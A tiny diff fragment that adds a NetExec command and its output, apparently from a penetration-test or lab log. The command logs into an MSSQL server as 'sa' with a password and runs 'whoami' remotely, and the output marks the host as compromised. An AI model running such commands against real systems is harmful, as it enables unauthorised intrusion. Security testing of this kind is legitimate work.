@@ -1,0 +1,4 @@
+$ nxc mssql 10.10.10.10 -u sa -p 'Sql_Server_2019!' -x whoami
+MSSQL       10.10.10.10     1433   DB01             [+] corp.local\sa:Sql_Server_2019! (Pwn3d!)
+MSSQL       10.10.10.10     1433   DB01             [+] Executed command via mssqlexec
+MSSQL       10.10.10.10     1433   DB01             nt service\mssql$sqlexpress
